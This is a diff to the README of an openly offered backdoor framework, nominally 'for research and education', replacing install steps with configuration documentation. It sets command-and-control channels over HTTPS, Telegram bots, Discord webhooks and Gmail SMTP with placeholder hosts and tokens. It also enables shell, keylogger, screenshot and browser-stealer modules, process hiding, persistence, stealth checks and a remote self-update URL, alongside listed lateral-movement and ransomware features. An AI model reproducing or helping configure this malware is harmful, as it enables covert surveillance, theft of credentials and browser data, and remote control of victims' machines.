@@ -37,45 +37,87 @@ A comprehensive, multi-protocol backdoor implementation for research and educati
 - **Lateral Movement**: Spread to other systems
 - **Ransomware**: File encryption/decryption (educational only)
 
-## Installation
+## Configuration
 
-### Prerequisites
-- Python 3.8+
-- Required packages: `pycryptodome`, `requests`, `psutil`, `pillow`, `pywin32` (Windows)
+The backdoor supports configuration through environment variables loaded from a `.env` file. This allows you to customize settings without modifying the code.
 
-### Setup
+### Environment Variables
+
+Create a `.env` file in the project root with your configuration:
+
 ```bash
-# Clone the repository
-git clone https://github.com/JonusNattapong/Backdoor.git
-cd Backdoor
+# Copy the template
+cp .env.example .env
 
-# Install dependencies
-pip install -r requirements.txt
+# Edit with your settings
+nano .env
 ```
 
-### Configuration
-Edit the configuration section in `main.py`:
+### Key Configuration Options
+
+#### C2 Server Configuration
+```env
+# HTTPS C2 Server
+C2_HTTPS_HOST=your-c2-server.com
+C2_HTTPS_PORT=443
+C2_HTTPS_PATH=/api/beacon
+
+# Telegram Bot C2
+TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN
+TELEGRAM_CHAT_ID=YOUR_TELEGRAM_CHAT_ID
+
+# Discord Webhook C2
+DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
+
+# Gmail SMTP C2
+GMAIL_EMAIL=backdoor.receiver@gmail.com
+GMAIL_APP_PASSWORD=YOUR_GMAIL_APP_PASSWORD
+```
+
+#### Operational Settings
+```env
+# Beacon timing (seconds)
+BEACON_INTERVAL=30
+BEACON_JITTER=0.3
+
+# Security settings
+ENCRYPT_COMMS=true
+COMPRESS_DATA=true
+HIDE_PROCESS=true
+
+# Enabled modules (comma-separated)
+ENABLED_MODULES=shell,file_manager,keylogger,screenshot,browser_stealer
+```
+
+#### Advanced Settings
+```env
+# Debug mode
+DEBUG_MODE=false
+LOG_LEVEL=INFO
+
+# Persistence and stealth
+ENABLE_PERSISTENCE=true
+ENABLE_STEALTH_CHECKS=true
+
+# Self-update URL
+UPDATE_URL=https://your-update-server.com/backdoor_update.py
+```
+
+### Configuration Loading
+
+The framework automatically loads environment variables from `.env` on startup. You can also reload configuration at runtime:
 
 ```python
-# C2 Servers configuration
-C2_SERVERS = [
-    {"protocol": "https", "host": "your-c2-server.com", "port": 443, "path": "/api/beacon"},
-    {"protocol": "telegram", "bot_token": "YOUR_BOT_TOKEN", "chat_id": "YOUR_CHAT_ID"},
-    # ... other protocols
-]
-
-# Beacon settings
-BEACON_INTERVAL = 30  # seconds between beacons
-JITTER = 0.3  # 30% randomization
-
-# Module selection
-MODULES = [
-    "shell",
-    "file_manager",
-    "keylogger",
-    # ... select desired modules
-]
+from config import Config
+Config.reload_config()  # Reload .env file
 ```
+
+### Security Notes
+
+- **Never commit `.env` files** - They contain sensitive information
+- Use strong, unique credentials for each C2 channel
+- Consider using encrypted environment variables for production
+- Rotate credentials regularly
 
 ## Usage
 
